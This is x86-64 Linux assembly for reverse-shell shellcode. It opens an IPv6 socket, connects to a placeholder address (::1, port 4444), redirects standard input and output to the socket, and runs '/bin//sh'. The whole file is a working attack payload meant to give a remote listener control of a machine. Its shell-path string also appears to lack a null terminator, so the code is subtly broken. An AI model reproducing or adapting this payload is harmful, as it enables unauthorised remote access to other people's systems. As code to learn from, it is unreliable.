global _start

section .text

_start:
    ; -------------------------------------------------------------------------
    ; 1. socket(AF_INET6, SOCK_STREAM, 0)
    ; -------------------------------------------------------------------------
    ; syscall number 41 (sys_socket)
    ; Arguments: rdi=AF_INET6(10), rsi=SOCK_STREAM(1), rdx=IPPROTO_IP(0)
    
    push 41
    pop rax         ; rax = 41
    push 10         ; AF_INET6 = 10
    pop rdi         ; rdi = 10
    push 1
    pop rsi         ; rsi = 1
    cdq             ; rdx = 0
    syscall

    ; Save the socket file descriptor (returned in RAX) to RDI.
    xchg rdi, rax   ; RDI now holds sockfd.

    ; -------------------------------------------------------------------------
    ; 2. connect(sockfd, sockaddr, addrlen)
    ; -------------------------------------------------------------------------
    ; syscall number 42 (sys_connect)
    ; Arguments: rdi=sockfd, rsi=struct sockaddr*, rdx=addrlen(28)

    ; Stack structure for sockaddr_in6 (28 bytes total):
    ; Layout (Low Addr -> High Addr):
    ;   [Family(2)][Port(2)][Flow(4)][Addr(16)][Scope(4)]
    ; We push in Reverse Order (High -> Low):

    ; 1. Push Scope ID (4 bytes) + Padding/Align (4 bytes) -> Total 8 bytes
    xor rax, rax    ; Zero out RAX
    push rax        ; Scope ID = 0 (and alignment padding)

    ; 2. Push IPv6 Address (16 bytes)
    ; Example: ::1 (Loopback) -> 00...00 00...01
    ; High Part (first 8 bytes on stack = last 8 bytes of IP)
    mov rax, 0x0000000000000001 ; Last byte is 1
    push rax
    ; Low Part (next 8 bytes on stack = first 8 bytes of IP)
    xor rax, rax    ; Remaining zeros
    push rax

    ; 3. Push FlowInfo(4) + Port(2) + Family(2) -> Total 8 bytes
    ; Family = 10 (0x000A)
    ; Port = 4444 (0x115C) -> Big Endian on stack 0x115C -> Memory: 11 5C
    ; Flow = 0
    ; Combined Register Value (Little Endian for push):
    ; Bytes: [0A 00] [11 5C] [00 00 00 00]
    ; Hex: 0x000000005C11000A
    mov rcx, 0x000000005C11000A
    push rcx

    mov rsi, rsp    ; rsi points to the struct
    push 28
    pop rdx         ; rdx = 28 (sizeof sockaddr_in6)
    push 42
    pop rax         ; rax = 42
    syscall

    ; -------------------------------------------------------------------------
    ; 3. dup2(sockfd, newfd)
    ; -------------------------------------------------------------------------
    ; Redirects Stdin (0), Stdout (1), Stderr (2) to the socket.
    
    push 3
    pop rsi
loop_dup2:
    dec rsi
    push 33
    pop rax
    syscall
    jnz loop_dup2

    ; -------------------------------------------------------------------------
    ; 4. execve("/bin//sh", NULL, NULL)
    ; -------------------------------------------------------------------------
    
    xor rsi, rsi
    cdq

    mov rbx, 0x68732f2f6e69622f ; "/bin//sh"
    push rbx
    
    push rsp
    pop rdi
    
    push 59
    pop rax
    syscall
